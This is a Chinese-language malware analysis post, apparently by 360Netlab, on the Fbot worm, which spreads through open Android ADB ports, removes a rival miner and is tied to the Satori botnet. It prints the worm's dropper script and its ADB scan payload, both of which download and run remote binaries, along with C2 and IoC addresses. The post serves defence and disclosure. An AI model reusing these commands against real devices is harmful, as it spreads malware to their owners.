# DNS的蠕虫

从2018-09-13 11:30 UTC开始，我们首次注意到一个新的蠕虫正在清理
com.ufo.miner。在完成了清理动作后，该蠕虫会等待来自C2（musl.lib，66.42.57.45:7000，
Singapore/SG）的下一步指令。我们将该蠕虫命名为fbot，主要是因为该蠕虫的主要执行模块使用了这个名字。该C2域名的解析，需要通过EmerDNS，一个emercoin.com旗下的区块链DNS完成。

com.ufo.miner 与我们之前多次 [报告](https://blog.netlab.360.com/tag/adbminer/) 的
ADB.Miner 类似，利用adb安卓调试接口传播，并挖矿。ADB.Miner 是我们今年二月首次
[报告](https://blog.netlab.360.com/early-warning-adb-miner-a-mining-botnet-utilizing-android-adb-is-now-rapidly-spreading/)
的，自那以后，类似的其他僵尸网络已经长期传播，[感染](https://forum.xda-developers.com/fire-tv/general/firestick-gen-2-test-app-popping-t3771601)了包括 Amazon FireTV
在内的多种设备。

最后，新的蠕虫Fbot与臭名昭著的 Satori 僵尸网络有关联。

#### 分析

FBot的恶意样本通过 adb 安卓系统调试接口投入，这与之前的 ADB.Miner 的投入方式一致。

投入载荷会下载执行
hxxp://188.209.52.142/c，或者是hxxp://188.209.52.142/w。这两个脚本的区别仅在下载方式是wget/curl，下文不再区分。两个脚本的主体功能一致，包括：

  * 尝试进一步从 188.209.52.142 下载 fbot.{arch} 恶意样本；
  * 卸载 com.ufo.miner，一个类似ADB.Miner的挖矿组件；
  * 完成自身清理工作。

该脚本的详细内容如下：

    
    
    #!/system/bin/sh
    
    n="arm7 mipsel mips x86 x86_64 aarch64"  
    http_server="188.209.52.142"
    
    for i in $n  
    do  
        cp /system/bin/sh fbot.$i
        >fbot.$i
        curl hxxp://$http_server/fbot.$i > fbot.$i   #    wget hxxp://$http_server/fbot.$i > fbot.$i
        chmod 777 fbot.$i
        ./fbot.$i
        rm fbot.$i
    done
    
    # Cleanup
    for i in $n  
    do  
        rm fbot.$i
    done
    
    pm uninstall com.ufo.miner
    
    # Suicide
    rm $0  
    

下载得到的 fbot.{arch} 是个mirai的变种，主要特点包括：

  * C2：musl.lib:7000，当前在EmerDNS上的解析地址为 66.42.57.45，Singapore/SG Singapore
  * 扫描和传播：针对 TCP 5555 adb 端口扫描。扫描成功后，会下载hxxp://188.209.52.142/c，完成对蠕虫自身的传播。
  * 进程清理：样本中会遍历 /proc/pid/exe 目录下面的特定进程，如smi、xig、rig等。枚举得到符合条件的进程后，会杀掉该进程。

该变种保留了 mirai 僵尸网络的DDoS功能，但我们尚未检测到该C2有发出DDoS攻击指令。

扫描阶段的载荷如下：

    
    
    shell:cd /data/local/tmp/; busybox wget hxxp://188.209.52.142/w -O -> w; sh w; rm w; curl http://188.209.52.142/c > c; sh c; rm c  
    

枚举进程列表

    
    
    /data/local/tmp/smi
    /data/local/tmp/xig
    /data/local/tmp/trinity
    /data/local/tmp/z
    /data/local/tmp/log
    /data/local/tmp/rig
    /data/local/tmp/.f
    /data/local/tmp/tyg
    

#### 主控域名 musl.lib 在EmereDNS上的解析

C2域名musl.lib不是一个标准的DNS域名。其顶级域 .lib 并没有在
[ICANN](https://www.iana.org/domains/root/db)
注册，也不能被通用的DNS系统解析，实际是由emercoin.com旗下EmerDNS系统解析。EmerDNS是一个基于区块链的DNS系统，在[其官方网站](https://emercoin.com/zh/emerdns)上宣称，EmerDNS建立与区块链技术之上，完全去中心化，只有记录创建者才能操作记录内容。

当用户要想访问 *.lib 的网站时，可以有几种选择。由于公共DNS服务商OpenNIC的支持，用户可以通过OpenNic公司旗下的公共DNS服务器访问
*.lib 网站，或者用户可以给浏览器安装特定器扩展，或者是自行架设Emer节点。

Fbot蠕虫作者选择了OpenNic公司的公共DNS服务。蠕虫中硬编码了一组OpenNic公共服务器IP地址，被感染的机器通过向这些服务器请求，得到
musl.lib 的EmerDNS解析IP。样本中硬编码的DNS解析服务器至少包括：

    
    
    176.126.70.119  
    163.53.248.170  
    174.138.48.29  
    5.132.191.104  
    107.172.42.186  
    163.172.168.171  
    174.138.48.29  
    185.208.208.141  
    163.53.248.170  
    5.132.191.104  
    

当前 musl.lib 的EmerDNS解析结果如下：

    
    
    https://explorer.emercoin.com/nvs//musl.lib//25/1/1  
    

读者可以利用如下命令重现上述解析过程：

    
    
    user@netlab.360.com$dig musl.lib @seed2.emercoin.com +short  
    66.42.57.45  
    

我们猜测恶意代码使用EmerDNS的原因，可能是下列之一：

  * 提高安全分析人员追踪的难度；
  * 安全分析人员难以通过与ICANN成员单位的合作来 sinkhole 该域名；

这样，恶意代码作者可以长期保持对该僵尸网络的控制。

#### Fbot 与 Satori 僵尸网络的关系

Fbot 蠕虫与 Satori 僵尸网络的关系，展现于下图中：

![fbot-and-satori-2.png](https://image.3001.net/images/20180915/1536946637_5b9bf1cd223da.png!small)  

在上图中：

  * Fbot的主控IP地址66.42.57.45，与Satori的主控域名 rippr.cc，通过和注册邮箱 ukrainianhorseriding.com/village@riseup.net 相连
  * 另外，27.102.115.44 这个IP与Fbot也有关系
    * 如图中所示该IP通过 4eouhp79tl5zqs2tbqee.ukrainianhorseriding.com 域名与Fbot主控IP相连；
    * 而且，该IP上的URL布局也与Fbot的下载服务器188.209.52.142的URL布局基本一致，见文末IoC。

综上，我们认为图中展示的域名、IP、URL、样本构成了强烈内聚的一簇，Fbot可以归属到Satori。

#### 联系我们

感兴趣的读者，可以在 [twitter](https://twitter.com/360Netlab) 或者在微信公众号 360Netlab
上联系我们。或者发送邮件给 netlab at 360 dot cn 。

#### IoC

下载服务器

    
    
    188.209.52.142 Netherlands/NL    AS49349  
    

C2服务器

    
    
    musl.lib         #主控域名，由区块链DNS系统EmerDNS解析  
    66.42.57.45:7000 #Singapore/SG Singapore  #当前主控IP  
    ukrainianhorseriding.com #历史关联域名  
    27.102.115.44    #Republic of Korea/KR    AS45996  
    rippr.cc         #历史关联域名，Satori主控  
    

下载URL

    
    
    hxxp://188.209.52.142/c          #脚本，会下载执行fbot.{arch}样本、卸载 com.ufo.miner 组件，并做清理  
    hxxp://188.209.52.142/w          #脚本，会下载执行fbot.{arch}样本、卸载 com.ufo.miner 组件，并做清理  
    hxxp://188.209.52.142/fbot.aarch64     #扫描器，下同，完成自身的蠕虫传播  
    hxxp://188.209.52.142/fbot.arm7  
    hxxp://188.209.52.142/fbot.mips  
    hxxp://188.209.52.142/fbot.mipsel  
    hxxp://188.209.52.142/fbot.x86  
    hxxp://188.209.52.142/fbot.x86_64  
    http://27.102.115.44/c          #历史关联脚本  
    http://27.102.115.44/w  
    http://27.102.115.44/mipsel.bot.le  
    http://27.102.115.44/mips.bot.be  
    http://27.102.115.44/i686.bot.le  
    http://27.102.115.44/arm7.bot.le  
    http://27.102.115.44/arm64.bot.le  
    http://27.102.115.44/x86_64.bot.le  
    http://27.102.115.44/adbs  
    http://27.102.115.44/adbs2  
    http://27.102.115.44/  
    

  

